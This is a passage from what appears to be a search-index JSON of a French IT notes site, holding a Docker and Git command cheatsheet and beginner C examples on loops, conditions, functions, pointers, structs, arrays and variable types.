d'ex\u00e9cution.</p>"},{"location":"IT/Cheatsheets/Docker/#gestion-des-images","title":"\ud83c\udfd7 Gestion des Images","text":""},{"location":"IT/Cheatsheets/Docker/#lister-les-images-disponibles","title":"Lister les images disponibles","text":"<pre><code>docker images\n</code></pre> <p>Affiche la liste des images Docker pr\u00e9sentes sur votre machine.</p>"},{"location":"IT/Cheatsheets/Docker/#telecharger-une-image","title":"T\u00e9l\u00e9charger une image","text":"<pre><code>docker pull &lt;image&gt;\n</code></pre> <p>R\u00e9cup\u00e8re l\u2019image sp\u00e9cifi\u00e9e depuis Docker Hub ou un registre priv\u00e9.</p>"},{"location":"IT/Cheatsheets/Docker/#supprimer-une-image","title":"Supprimer une image","text":"<pre><code>docker rmi &lt;image_id&gt;\n</code></pre> <p>Supprime l\u2019image sp\u00e9cifi\u00e9e.</p>"},{"location":"IT/Cheatsheets/Docker/#supprimer-toutes-les-images-inutilisees","title":"Supprimer toutes les images inutilis\u00e9es","text":"<pre><code>docker image prune\n</code></pre> <p>Supprime toutes les images qui ne sont plus utilis\u00e9es par des conteneurs.</p>"},{"location":"IT/Cheatsheets/Docker/#gestion-des-volumes","title":"\ud83d\udd04 Gestion des Volumes","text":""},{"location":"IT/Cheatsheets/Docker/#lister-les-volumes","title":"Lister les volumes","text":"<pre><code>docker volume ls\n</code></pre> <p>Affiche tous les volumes Docker disponibles.</p>"},{"location":"IT/Cheatsheets/Docker/#creer-un-volume","title":"Cr\u00e9er un volume","text":"<pre><code>docker volume create &lt;nom_volume&gt;\n</code></pre> <p>Cr\u00e9e un volume qui pourra \u00eatre utilis\u00e9 par les conteneurs.</p>"},{"location":"IT/Cheatsheets/Docker/#supprimer-un-volume","title":"Supprimer un volume","text":"<pre><code>docker volume rm &lt;nom_volume&gt;\n</code></pre> <p>Supprime un volume inutilis\u00e9.</p>"},{"location":"IT/Cheatsheets/Docker/#supprimer-tous-les-volumes-non-utilises","title":"Supprimer tous les volumes non utilis\u00e9s","text":"<pre><code>docker volume prune\n</code></pre> <p>Nettoie et supprime tous les volumes qui ne sont plus utilis\u00e9s.</p>"},{"location":"IT/Cheatsheets/Docker/#gestion-des-reseaux","title":"\ud83c\udfd7 Gestion des R\u00e9seaux","text":""},{"location":"IT/Cheatsheets/Docker/#lister-les-reseaux-docker","title":"Lister les r\u00e9seaux Docker","text":"<pre><code>docker network ls\n</code></pre> <p>Affiche tous les r\u00e9seaux disponibles sur Docker.</p>"},{"location":"IT/Cheatsheets/Docker/#creer-un-reseau","title":"Cr\u00e9er un r\u00e9seau","text":"<pre><code>docker network create &lt;nom_reseau&gt;\n</code></pre> <p>Cr\u00e9e un r\u00e9seau personnalis\u00e9 pour connecter des conteneurs.</p>"},{"location":"IT/Cheatsheets/Docker/#ajouter-un-conteneur-a-un-reseau","title":"Ajouter un conteneur \u00e0 un r\u00e9seau","text":"<pre><code>docker network connect &lt;nom_reseau&gt; &lt;id_conteneur&gt;\n</code></pre> <p>Ajoute un conteneur sp\u00e9cifique \u00e0 un r\u00e9seau Docker.</p>"},{"location":"IT/Cheatsheets/Docker/#supprimer-un-reseau","title":"Supprimer un r\u00e9seau","text":"<pre><code>docker network rm &lt;nom_reseau&gt;\n</code></pre> <p>Supprime un r\u00e9seau qui n\u2019est plus utilis\u00e9.</p>"},{"location":"IT/Cheatsheets/Docker/#inspection-et-debug","title":"\ud83d\udd0d Inspection et Debug","text":""},{"location":"IT/Cheatsheets/Docker/#voir-les-logs-dun-conteneur","title":"Voir les logs d'un conteneur","text":"<pre><code>docker logs &lt;id_containeur&gt;\n</code></pre> <p>Affiche les logs g\u00e9n\u00e9r\u00e9s par le conteneur en cours d'ex\u00e9cution.</p>"},{"location":"IT/Cheatsheets/Docker/#suivre-les-logs-en-temps-reel","title":"Suivre les logs en temps r\u00e9el","text":"<pre><code>docker logs -f &lt;id_containeur&gt;\n</code></pre> <p>Affiche les logs en continu (<code>-f</code> pour follow).</p>"},{"location":"IT/Cheatsheets/Docker/#inspecter-un-conteneur","title":"Inspecter un conteneur","text":"<pre><code>docker inspect &lt;id_containeur&gt;\n</code></pre> <p>Renvoie toutes les informations d\u00e9taill\u00e9es sur un conteneur (r\u00e9seau, montage de volumes, environnement...).</p>"},{"location":"IT/Cheatsheets/Docker/#voir-lutilisation-des-ressources-par-les-conteneurs","title":"Voir l'utilisation des ressources par les conteneurs","text":"<pre><code>docker stats\n</code></pre> <p>Affiche en temps r\u00e9el l\u2019utilisation CPU/m\u00e9moire/disque/r\u00e9seau de chaque conteneur actif.</p>"},{"location":"IT/Cheatsheets/Docker/#executer-des-commandes-dans-un-conteneur","title":"\u2699 Ex\u00e9cuter des Commandes dans un Conteneur","text":""},{"location":"IT/Cheatsheets/Docker/#executer-une-commande-dans-un-conteneur-en-cours-dexecution","title":"Ex\u00e9cuter une commande dans un conteneur en cours d'ex\u00e9cution","text":"<pre><code>docker exec -it &lt;id_containeur&gt; /bin/bash\n</code></pre> <p>Ouvre un shell interactif dans le conteneur (utile pour le d\u00e9bogage).</p>"},{"location":"IT/Cheatsheets/Docker/#copier-un-fichier-de-lhote-vers-un-conteneur","title":"Copier un fichier de l\u2019h\u00f4te vers un conteneur","text":"<pre><code>docker cp &lt;fichier_local&gt; &lt;id_containeur&gt;:/chemin/destination\n</code></pre> <p>Copie un fichier depuis l\u2019h\u00f4te vers un conteneur.</p>"},{"location":"IT/Cheatsheets/Docker/#copier-un-fichier-dun-conteneur-vers-lhote","title":"Copier un fichier d\u2019un conteneur vers l\u2019h\u00f4te","text":"<pre><code>docker cp &lt;id_containeur&gt;:/chemin/source &lt;destination_local&gt;\n</code></pre> <p>Extrait un fichier du conteneur vers la machine h\u00f4te.</p>"},{"location":"IT/Cheatsheets/Docker/#gestion-des-dockerfiles-et-builds","title":"\ud83d\udcdc Gestion des Dockerfiles et Builds","text":""},{"location":"IT/Cheatsheets/Docker/#construire-une-image-depuis-un-dockerfile","title":"Construire une image depuis un Dockerfile","text":"<pre><code>docker build -t &lt;nom_image&gt; .\n</code></pre> <p>Construit une nouvelle image Docker en utilisant un <code>Dockerfile</code> dans le dossier courant.</p>"},{"location":"IT/Cheatsheets/Docker/#lancer-un-conteneur-depuis-une-image-locale","title":"Lancer un conteneur depuis une image locale","text":"<pre><code>docker run &lt;nom_image&gt;\n</code></pre> <p>Cr\u00e9e et ex\u00e9cute un conteneur bas\u00e9 sur une image que vous avez construite.</p>"},{"location":"IT/Cheatsheets/Docker/#nettoyage-et-maintenance","title":"\ud83d\udee0 Nettoyage et Maintenance","text":""},{"location":"IT/Cheatsheets/Docker/#supprimer-tous-les-conteneurs-arretes_1","title":"Supprimer tous les conteneurs arr\u00eat\u00e9s","text":"<pre><code>docker container prune\n</code></pre> <p>Lib\u00e8re de l\u2019espace en supprimant tous les conteneurs qui ne sont plus en cours d\u2019ex\u00e9cution.</p>"},{"location":"IT/Cheatsheets/Docker/#supprimer-toutes-les-images-inutilisees_1","title":"Supprimer toutes les images inutilis\u00e9es","text":"<pre><code>docker image prune\n</code></pre> <p>Efface les images qui ne sont plus utilis\u00e9es par des conteneurs.</p>"},{"location":"IT/Cheatsheets/Docker/#supprimer-tous-les-volumes-inutilises","title":"Supprimer tous les volumes inutilis\u00e9s","text":"<pre><code>docker volume prune\n</code></pre> <p>Nettoie les volumes qui ne sont plus attach\u00e9s \u00e0 des conteneurs.</p>"},{"location":"IT/Cheatsheets/Docker/#supprimer-tous-les-reseaux-inutilises","title":"Supprimer tous les r\u00e9seaux inutilis\u00e9s","text":"<pre><code>docker network prune\n</code></pre> <p>Efface les r\u00e9seaux Docker qui ne sont plus utilis\u00e9s.</p>"},{"location":"IT/Cheatsheets/Docker/#docker-compose-pour-les-configurations-multi-conteneurs","title":"\ud83c\udfd7 Docker Compose (pour les configurations multi-conteneurs)","text":""},{"location":"IT/Cheatsheets/Docker/#lancer-un-projet-docker-compose","title":"Lancer un projet Docker Compose","text":"<pre><code>docker-compose up -d\n</code></pre> <p>D\u00e9marre les services d\u00e9finis dans <code>docker-compose.yml</code> en mode d\u00e9tach\u00e9 (<code>-d</code>).</p>"},{"location":"IT/Cheatsheets/Docker/#arreter-un-projet-docker-compose","title":"Arr\u00eater un projet Docker Compose","text":"<pre><code>docker-compose down\n</code></pre> <p>Arr\u00eate et supprime les conteneurs d\u00e9finis dans <code>docker-compose.yml</code>.</p>"},{"location":"IT/Cheatsheets/Docker/#verifier-les-logs-des-services","title":"V\u00e9rifier les logs des services","text":"<pre><code>docker-compose logs -f\n</code></pre> <p>Affiche en temps r\u00e9el les logs de tous les services d\u00e9finis dans <code>docker-compose.yml</code>.</p>"},{"location":"IT/Cheatsheets/Git/","title":"Git","text":""},{"location":"IT/Cheatsheets/Git/#configuration-initiale","title":"\ud83d\ude80 Configuration Initiale","text":""},{"location":"IT/Cheatsheets/Git/#configuration-du-nom-dutilisateur","title":"Configuration du nom d'utilisateur","text":"<pre><code>git config --global user.name \"Votre Nom\"\n</code></pre> <p>Cette commande configure le nom associ\u00e9 \u00e0 vos futurs commits \u00e0 l\u2019\u00e9chelle globale (pour votre utilisateur). Ainsi, Git saura toujours quel nom attribuer aux modifications que vous effectuez.</p>"},{"location":"IT/Cheatsheets/Git/#configuration-de-lemail","title":"Configuration de l'email","text":"<pre><code>git config --global user.email \"votre.email@example.com\"\n</code></pre> <p>De m\u00eame, cette commande d\u00e9finit l\u2019adresse email qui appara\u00eetra dans l\u2019historique des commits. Elle doit id\u00e9alement correspondre \u00e0 l\u2019adresse avec laquelle vous vous identifiez sur une plateforme Git (ex. GitHub, GitLab).</p>"},{"location":"IT/Cheatsheets/Git/#afficher-la-configuration","title":"Afficher la configuration","text":"<pre><code>git config --list\n</code></pre> <p>Permet de lister toutes les configurations Git actuellement en vigueur. Vous pouvez v\u00e9rifier ici que votre nom, votre email et d\u2019autres r\u00e9glages sont correctement configur\u00e9s.</p>"},{"location":"IT/Cheatsheets/Git/#editer-la-configuration","title":"\u00c9diter la configuration","text":"<pre><code>git config --global --edit\n</code></pre> <p>Ouvre le fichier de configuration Git (global) dans votre \u00e9diteur par d\u00e9faut pour apporter des modifications manuelles. C\u2019est utile pour corriger ou personnaliser certains param\u00e8tres plus avanc\u00e9s.</p>"},{"location":"IT/Cheatsheets/Git/#commandes-de-base","title":"\ud83c\udf7c Commandes de Base","text":""},{"location":"IT/Cheatsheets/Git/#initialiser-un-depot-git","title":"Initialiser un d\u00e9p\u00f4t Git","text":"<pre><code>git init\n</code></pre> <p>Cr\u00e9e un nouveau d\u00e9p\u00f4t Git dans le dossier courant, en initialisant un r\u00e9pertoire.</p>"},{"location":"IT/Cheatsheets/Git/#cloner-un-depot-existant","title":"Cloner un d\u00e9p\u00f4t existant","text":"<pre><code>git clone &lt;url&gt;\n</code></pre> <p>Permet de r\u00e9cup\u00e9rer un d\u00e9p\u00f4t Git existant (par exemple depuis GitHub ou un serveur priv\u00e9) dans un nouveau dossier local. Vous obtenez ainsi l\u2019historique complet et la derni\u00e8re version des fichiers.</p>"},{"location":"IT/Cheatsheets/Git/#ajouter-des-fichiers-au-staging-area","title":"Ajouter des fichiers au staging area","text":"<pre><code>git add &lt;fichier&gt;\ngit add .\n</code></pre> <p>Pr\u00e9pare les fichiers sp\u00e9cifi\u00e9s (ou tous les fichiers pr\u00e9sents avec <code>git add .</code>) pour le prochain commit. Vous indiquez ainsi \u00e0 Git pr\u00e9cis\u00e9ment quelles modifications vous souhaitez enregistrer.</p>"},{"location":"IT/Cheatsheets/Git/#verifier-le-statut-des-fichiers","title":"V\u00e9rifier le statut des fichiers","text":"<pre><code>git status\n</code></pre> <p>Affiche l\u2019\u00e9tat actuel du d\u00e9p\u00f4t\u202f: vous pouvez voir quels fichiers sont modifi\u00e9s, ajout\u00e9s, en attente de commit ou ignor\u00e9s. Tr\u00e8s pratique pour faire le point avant de valider vos changements.</p>"},{"location":"IT/Cheatsheets/Git/#afficher-les-modifications","title":"Afficher les modifications","text":"<pre><code>git diff\n</code></pre> <p>Montre ligne par ligne ce qui a \u00e9t\u00e9 modifi\u00e9 dans vos fichiers. Vous pouvez ainsi identifier pr\u00e9cis\u00e9ment les changements en attente de validation (ou entre deux commits sp\u00e9cifiques si vous utilisez <code>git diff &lt;commit1&gt; &lt;commit2&gt;</code>).</p>"},{"location":"IT/Cheatsheets/Git/#commit-les-changements","title":"Commit les changements","text":"<pre><code>git commit -m \"Message du commit\"\n</code></pre> <p>Enregistre de fa\u00e7on d\u00e9finitive dans l\u2019historique local les modifications que vous aviez ajout\u00e9es au staging area (avec <code>git add</code>). Le message de commit doit \u00eatre clair et descriptif pour retracer l\u2019\u00e9volution du projet.</p>"},{"location":"IT/Cheatsheets/Git/#afficher-lhistorique-des-commits","title":"Afficher l'historique des commits","text":"<pre><code>git log\ngit log --oneline --graph --all\n</code></pre> <p><code>git log</code> liste tous les commits pass\u00e9s avec leurs informations d\u00e9taill\u00e9es, tandis que <code>--oneline --graph --all</code> offre une vue condens\u00e9e et plus visuelle de l\u2019historique. Cela facilite le suivi et la compr\u00e9hension du travail r\u00e9alis\u00e9.</p>"},{"location":"IT/Cheatsheets/Git/#branches","title":"\ud83c\udf33 Branches","text":""},{"location":"IT/Cheatsheets/Git/#lister-les-branches","title":"Lister les branches","text":"<pre><code>git branch\n</code></pre> <p>Affiche toutes les branches pr\u00e9sentes dans votre d\u00e9p\u00f4t local, en indiquant celle sur laquelle vous vous trouvez actuellement. Les branches sont des \u00ab\u202flignes de d\u00e9veloppement\u202f\u00bb ind\u00e9pendantes.</p>"},{"location":"IT/Cheatsheets/Git/#creer-une-nouvelle-branche","title":"Cr\u00e9er une nouvelle branche","text":"<pre><code>git branch &lt;nom_branche&gt;\n</code></pre> <p>Cr\u00e9e une nouvelle branche \u00e0 partir de la branche courante sans basculer dessus. Cela vous permet de travailler sur une fonctionnalit\u00e9 ou un correctif isol\u00e9 du reste du projet.</p>"},{"location":"IT/Cheatsheets/Git/#changer-de-branche","title":"Changer de branche","text":"<pre><code>git checkout &lt;nom_branche&gt;\n</code></pre> <p>Bascule sur la branche sp\u00e9cifi\u00e9e, en mettant \u00e0 jour votre environnement de travail local pour refl\u00e9ter l\u2019\u00e9tat de cette branche. Assurez-vous d\u2019avoir commit\u00e9 ou sauvegard\u00e9 vos modifications avant de changer de branche.</p>"},{"location":"IT/Cheatsheets/Git/#creer-et-changer-de-branche","title":"Cr\u00e9er et changer de branche","text":"<pre><code>git checkout -b &lt;nom_branche&gt;\n</code></pre> <p>Combine la cr\u00e9ation d\u2019une branche et le basculement sur cette derni\u00e8re en une seule \u00e9tape. Pratique pour gagner du temps lorsque vous d\u00e9butez une nouvelle fonctionnalit\u00e9.</p>"},{"location":"IT/Cheatsheets/Git/#fusionner-une-branche-dans-la-branche-courante","title":"Fusionner une branche dans la branche courante","text":"<pre><code>git merge &lt;nom_branche&gt;\n</code></pre> <p>Fusionne les modifications de la branche indiqu\u00e9e vers la branche sur laquelle vous vous situez. Attention aux \u00e9ventuels conflits qu\u2019il faudra r\u00e9soudre si des modifications contradictoires ont \u00e9t\u00e9 r\u00e9alis\u00e9es.</p>"},{"location":"IT/Cheatsheets/Git/#supprimer-une-branche","title":"Supprimer une branche","text":"<pre><code>git branch -d &lt;nom_branche&gt;\n</code></pre> <p>Supprime la branche sp\u00e9cifi\u00e9e si elle a d\u00e9j\u00e0 \u00e9t\u00e9 fusionn\u00e9e ou si vous avez bien g\u00e9r\u00e9 son contenu. C\u2019est une bonne pratique pour garder un environnement propre lorsque la branche n\u2019est plus n\u00e9cessaire.</p>"},{"location":"IT/Cheatsheets/Git/#remote-repositories","title":"\ud83d\udef0\ufe0f Remote Repositories","text":""},{"location":"IT/Cheatsheets/Git/#ajouter-un-depot-distant","title":"Ajouter un d\u00e9p\u00f4t distant","text":"<pre><code>git remote add origin &lt;url&gt;\n</code></pre> <p>Associe le d\u00e9p\u00f4t local \u00e0 un d\u00e9p\u00f4t distant (souvent appel\u00e9 <code>origin</code>). Indispensable pour pouvoir partager votre code ou r\u00e9cup\u00e9rer les modifications d\u2019autres contributeurs.</p>"},{"location":"IT/Cheatsheets/Git/#verifier-les-depots-distants","title":"V\u00e9rifier les d\u00e9p\u00f4ts distants","text":"<pre><code>git remote -v\n</code></pre> <p>Liste les d\u00e9p\u00f4ts distants (par exemple <code>origin</code>) ainsi que leurs URLs. Vous pouvez ainsi confirmer l\u2019adresse du serveur ou du service h\u00e9bergeant votre code.</p>"},{"location":"IT/Cheatsheets/Git/#recuperer-les-modifications-depuis-le-depot-distant","title":"R\u00e9cup\u00e9rer les modifications depuis le d\u00e9p\u00f4t distant","text":"<pre><code>git fetch origin\n</code></pre> <p>T\u00e9l\u00e9charge les nouveaux commits et branches depuis le d\u00e9p\u00f4t distant sans les fusionner automatiquement dans votre branche locale. C\u2019est utile pour voir ce qui a chang\u00e9 avant de d\u00e9cider de fusionner.</p>"},{"location":"IT/Cheatsheets/Git/#recuperer-et-fusionner-les-modifications-du-depot-distant","title":"R\u00e9cup\u00e9rer et fusionner les modifications du d\u00e9p\u00f4t distant","text":"<pre><code>git pull origin &lt;nom_branche&gt;\n</code></pre> <p>Fait \u00e0 la fois un <code>fetch</code> et un <code>merge</code> (ou un <code>rebase</code>, selon la configuration). C\u2019est la m\u00e9thode la plus courante pour mettre \u00e0 jour votre branche locale avec les derniers changements de vos collaborateurs.</p>"},{"location":"IT/Cheatsheets/Git/#envoyer-les-commits-locaux-vers-le-depot-distant","title":"Envoyer les commits locaux vers le d\u00e9p\u00f4t distant","text":"<pre><code>git push origin &lt;nom_branche&gt;\n</code></pre> <p>Envoie vos commits locaux (qui ne sont pas encore sur le serveur) vers la branche sp\u00e9cifi\u00e9e du d\u00e9p\u00f4t distant. Ainsi, les autres contributeurs peuvent r\u00e9cup\u00e9rer vos derni\u00e8res modifications.</p>"},{"location":"IT/Cheatsheets/Git/#supprimer-un-depot-distant","title":"Supprimer un d\u00e9p\u00f4t distant","text":"<pre><code>git remote remove &lt;nom_d\u00e9p\u00f4t&gt;\n</code></pre> <p>Retire la r\u00e9f\u00e9rence au d\u00e9p\u00f4t distant de votre configuration locale. Les fichiers locaux restent inchang\u00e9s, mais vous ne pourrez plus effectuer de <code>push</code> ou <code>pull</code> vers le d\u00e9p\u00f4t distant supprim\u00e9.</p>"},{"location":"IT/Dev/C/Bases/Boucles/","title":"Boucles","text":"<pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n    int i;\n\n    printf(\"Boucle for:\\n\");\n    for (i = 0; i &lt; 5; i++) {\n        printf(\"%d \", i);\n    }\n\n    printf(\"\\nBoucle while:\\n\");\n    i = 0;\n    while (i &lt; 5) {\n        printf(\"%d \", i);\n        i++;\n    }\n\n    return 0;\n}\n</code></pre> <ul> <li>Boucle <code>for</code> : Permet de r\u00e9p\u00e9ter un bloc de code un nombre sp\u00e9cifique de fois. La boucle ici compte de 0 \u00e0 4.</li> <li>Boucle <code>while</code> : Une autre structure de boucle. Elle ex\u00e9cute le bloc de code tant que la condition (<code>i &lt; 5</code>) est vraie.</li> </ul>"},{"location":"IT/Dev/C/Bases/Conditions/","title":"Conditions","text":"<pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n    int nombre = 5;\n\n    if (nombre &gt; 0) {\n        printf(\"Nombre est positif\\n\");\n    } \n    else {\n        printf(\"Nombre est n\u00e9gatif ou z\u00e9ro\\n\");\n    }\n\n    return 0;\n}\n</code></pre> <ul> <li>Ce snippet illustre l'utilisation de la structure conditionnelle <code>if-else</code>. Elle permet de prendre des d\u00e9cisions en fonction de la condition sp\u00e9cifi\u00e9e (<code>nombre &gt; 0</code> ici).</li> <li>Si la condition est vraie, le bloc <code>if</code> est ex\u00e9cut\u00e9. Sinon, le bloc <code>else</code> est ex\u00e9cut\u00e9.</li> </ul>"},{"location":"IT/Dev/C/Bases/Fonctions/","title":"Fonctions","text":"<pre><code>#include &lt;stdio.h&gt;\n\nint somme(int a, int b) {\n    return a + b;\n}\n\nint main() {\n    int result = somme(5, 3);\n    printf(\"R\u00e9sultat: %d\\n\", result);\n    return 0;\n}\n</code></pre> <ul> <li>D\u00e9finit une fonction <code>somme</code> qui prend deux param\u00e8tres (deux entiers) et renvoie leur somme.</li> <li>Dans <code>main</code>, la fonction <code>somme</code> est appel\u00e9e avec deux arguments (5 et 3) et le r\u00e9sultat est stock\u00e9 dans <code>result</code>, puis affich\u00e9.</li> </ul>"},{"location":"IT/Dev/C/Bases/Pointeur/","title":"Pointeur","text":"<pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n    int var = 100;\n    int *ptr;\n\n    ptr = &amp;var;\n\n    printf(\"Valeur de var: %d\\n\", var);\n    printf(\"Adresse de var: %p\\n\", &amp;var);\n    printf(\"Valeur point\u00e9e par ptr: %d\\n\", *ptr);\n\n    return 0;\n}\n</code></pre> <ul> <li>Un pointeur <code>ptr</code> est d\u00e9clar\u00e9. Il est con\u00e7u pour stocker l'adresse d'une variable de type <code>int</code>.</li> <li><code>&amp;var</code> obtient l'adresse de la variable <code>var</code>, et <code>ptr = &amp;var</code> assigne cette adresse au pointeur.</li> <li><code>*ptr</code> est utilis\u00e9 pour acc\u00e9der \u00e0 la valeur \u00e0 l'adresse stock\u00e9e dans le pointeur, affichant ainsi la valeur de <code>var</code>.</li> </ul> <p>Un cas simple et classique de l'utilisation des pointeurs en C est le passage d'arguments par r\u00e9f\u00e9rence \u00e0 une fonction. Cela permet \u00e0 la fonction de modifier la valeur des arguments pass\u00e9s, ce qui est impossible avec un passage d'arguments par valeur (le mode par d\u00e9faut en C).</p> <p>Imaginons que vous vouliez \u00e9crire une fonction qui \u00e9change les valeurs de deux variables. Sans pointeurs, vous ne pourriez pas faire cela directement, car toute modification \u00e0 une variable pass\u00e9e \u00e0 une fonction serait locale \u00e0 cette fonction. Mais avec les pointeurs, vous pouvez passer les adresses des variables et modifier leurs valeurs directement.</p> <p>Voici un exemple simple :</p> <pre><code>#include &lt;stdio.h&gt;  \n// Fonction pour \u00e9changer les valeurs de deux variables \n\nvoid swap(int *x, int *y) {     \nint temp = *x;     \n*x = *y;     \n*y = temp; \n}  \n\nint main() {     \nint a = 10;     \nint b = 20;      \nprintf(\"Avant le swap : a = %d, b = %d\\n\", a, b);      \n\n// Appel de la fonction swap avec les adresses de a et b     \n\nswap(&amp;a, &amp;b);      \nprintf(\"Apr\u00e8s le swap : a = %d, b = %d\\n\", a, b);      \nreturn 0; \n}\n</code></pre> <p>Dans cet exemple :</p> <ol> <li> <p>Fonction <code>swap</code> : Prend deux pointeurs <code>int *x</code> et <code>int *y</code> comme arguments, qui sont les adresses des variables <code>a</code> et <code>b</code>.</p> </li> <li> <p>Echange des valeurs : Dans <code>swap</code>, <code>*x</code> et <code>*y</code> permettent d'acc\u00e9der aux valeurs stock\u00e9es aux adresses point\u00e9es par <code>x</code> et <code>y</code>, respectivement. La fonction \u00e9change ces valeurs.</p> </li> <li> <p>Passage des adresses : Lorsque vous appelez <code>swap(&amp;a, &amp;b)</code>, vous passez les adresses de <code>a</code> et <code>b</code>, permettant \u00e0 la fonction <code>swap</code> de modifier les variables originales.</p> </li> </ol> <p>Ce cas illustre bien la puissance des pointeurs en permettant des modifications directes sur les variables pass\u00e9es \u00e0 une fonction, ce qui serait impossible autrement en C.</p>"},{"location":"IT/Dev/C/Bases/Structure%20programme%20simple/","title":"Structure programme simple","text":"<pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n    printf(\"Bonjour, le monde!\\n\");\n    return 0;\n}\n</code></pre> <ul> <li><code>#include &lt;stdio.h&gt;</code> : Ceci est une directive de pr\u00e9processeur. Elle indique au compilateur d'inclure le contenu du fichier d'en-t\u00eate standard <code>stdio.h</code>. Ce fichier est n\u00e9cessaire pour utiliser la fonction <code>printf</code>.</li> <li><code>int main()</code> : D\u00e9clare la fonction principale <code>main</code>. En C, <code>main</code> est le point d'entr\u00e9e de tout programme. Le programme commence \u00e0 s'ex\u00e9cuter \u00e0 partir de cette fonction. <code>int</code> signifie que <code>main</code> renvoie un entier.</li> <li><code>printf(\"Bonjour, le monde!\\n\");</code> : <code>printf</code> est utilis\u00e9e pour afficher la cha\u00eene de caract\u00e8res entre guillemets sur la console. <code>\\n</code> est un caract\u00e8re sp\u00e9cial qui repr\u00e9sente une nouvelle ligne.</li> <li><code>return 0;</code> : Indique que le programme s'est ex\u00e9cut\u00e9 avec succ\u00e8s. Le <code>0</code> est renvoy\u00e9 au syst\u00e8me d'exploitation.</li> </ul>"},{"location":"IT/Dev/C/Bases/Structures/","title":"Structures","text":"<p>En programmation en C, les structures (ou \"structs\") sont des types de donn\u00e9es qui permettent de regrouper plusieurs variables de types diff\u00e9rents sous un m\u00eame nom. Elles sont utiles pour organiser et manipuler des donn\u00e9es complexes de mani\u00e8re efficace.</p> <p>Voici un exemple d\u00e9taill\u00e9 d'une structure en C et son utilisation :</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\n// D\u00e9finition de la structure \"Personne\"\nstruct Personne {\n    char nom[50];\n    int age;\n    float taille;\n};\n\nint main() {\n    // D\u00e9claration d'une variable de type \"Personne\"\n    struct Personne personne1;\n\n    // Initialisation des champs de la structure \"personne1\"\n    strcpy(personne1.nom, \"Jean Dupont\");\n    personne1.age = 30;\n    personne1.taille = 1.75;\n\n    // Affichage des informations de la personne\n    printf(\"Nom: %s\\n\", personne1.nom);\n    printf(\"Age: %d\\n\", personne1.age);\n    printf(\"Taille: %.2f\\n\", personne1.taille);\n\n    // Modification de l'\u00e2ge de la personne\n    personne1.age = 35;\n\n    // Affichage des informations mises \u00e0 jour\n    printf(\"Nouvel \u00e2ge: %d\\n\", personne1.age);\n\n    return 0;\n}\n</code></pre> <p>Dans cet exemple :</p> <ul> <li>Une structure <code>Personne</code> est d\u00e9finie avec trois champs : <code>nom</code> (une cha\u00eene de caract\u00e8res), <code>age</code> (un entier) et <code>taille</code> (un nombre \u00e0 virgule flottante).</li> <li>Dans la fonction <code>main()</code>, une variable de type <code>Personne</code> appel\u00e9e <code>personne1</code> est d\u00e9clar\u00e9e.</li> <li>Les champs de la structure <code>personne1</code> sont initialis\u00e9s avec des valeurs sp\u00e9cifiques \u00e0 l'aide de la fonction <code>strcpy()</code> pour le nom et d'assignations directes pour l'\u00e2ge et la taille.</li> <li>Les informations de la personne sont affich\u00e9es \u00e0 l'\u00e9cran.</li> <li>L'\u00e2ge de la personne est ensuite mis \u00e0 jour en modifiant directement le champ <code>age</code> de la structure <code>personne1</code>.</li> <li>Les informations mises \u00e0 jour sont ensuite affich\u00e9es \u00e0 nouveau.</li> </ul> <p>Les structures en C permettent donc de regrouper des donn\u00e9es associ\u00e9es sous une m\u00eame entit\u00e9, ce qui facilite la manipulation et la gestion des informations dans un programme.</p>"},{"location":"IT/Dev/C/Bases/Tableaux/","title":"Tableaux","text":"<p>En programmation en C, les tableaux sont des structures de donn\u00e9es permettant de stocker une collection ordonn\u00e9e d'\u00e9l\u00e9ments de m\u00eame type sous un m\u00eame nom. Voici un exemple d\u00e9taill\u00e9 d'un tableau en C et son utilisation :</p> <pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n    // D\u00e9claration et initialisation d'un tableau d'entiers\n    int tableau_entiers[5] = {10, 20, 30, 40, 50};\n\n    // Affichage des \u00e9l\u00e9ments du tableau\n    printf(\"El\u00e9ments du tableau d'entiers :\\n\");\n    for (int i = 0; i &lt; 5; i++) {\n        printf(\"%d \", tableau_entiers[i]);\n    }\n    printf(\"\\n\");\n\n    // Acc\u00e8s et modification d'un \u00e9l\u00e9ment du tableau\n    tableau_entiers[2] = 35;\n\n    // Affichage du tableau apr\u00e8s modification\n    printf(\"Tableau apr\u00e8s modification :\\n\");\n    for (int i = 0; i &lt; 5; i++) {\n        printf(\"%d \", tableau_entiers[i]);\n    }\n    printf(\"\\n\");\n\n    return 0;\n}\n</code></pre> <p>Dans cet exemple :</p> <ul> <li>Un tableau d'entiers <code>tableau_entiers</code> de taille 5 est d\u00e9clar\u00e9 et initialis\u00e9 avec les valeurs <code>{10, 20, 30, 40, 50}</code>.</li> <li>Les \u00e9l\u00e9ments du tableau sont ensuite affich\u00e9s \u00e0 l'aide d'une boucle <code>for</code>.</li> <li>Un \u00e9l\u00e9ment du tableau est modifi\u00e9 en acc\u00e9dant \u00e0 l'indice correspondant (<code>tableau_entiers[2]</code>) et en lui attribuant une nouvelle valeur (<code>35</code>).</li> <li>Le tableau est \u00e0 nouveau affich\u00e9 pour montrer la modification.</li> </ul> <p>Les tableaux en C sont utiles pour stocker des collections d'\u00e9l\u00e9ments de mani\u00e8re efficace et les manipuler \u00e0 l'aide d'indices. Ils sont souvent utilis\u00e9s dans de nombreux algorithmes et structures de donn\u00e9es.</p>"},{"location":"IT/Dev/C/Bases/Variables%20et%20types/","title":"Variables et types","text":"<pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n    int entier = 10;\n    float flottant = 10.5;\n    char caractere = 'A';\n\n    printf(\"Entier: %d, Flottant: %f, Caract\u00e8re: %c\\n\", entier, flottant, caractere);\n    return 0;\n}\n</code></pre> <ul> <li>Trois types de variables sont d\u00e9clar\u00e9s ici : <code>int</code> (entier), <code>float</code> (nombre \u00e0 virgule flottante) et <code>char</code> (caract\u00e8re). Chaque type sert \u00e0 stocker un type de donn\u00e9es sp\u00e9cifique.</li> <li>La fonction <code>printf</code> est utilis\u00e9e pour afficher les valeurs de ces variables. <code>%d</code>, <code>%f</code>, et <code>%c</code> sont des sp\u00e9cificateurs de format qui indiquent \u00e0 <code>printf</code> comment interpr\u00e9ter les valeurs (respectivement comme entier, flottant, et caract\u00e8re).</li> 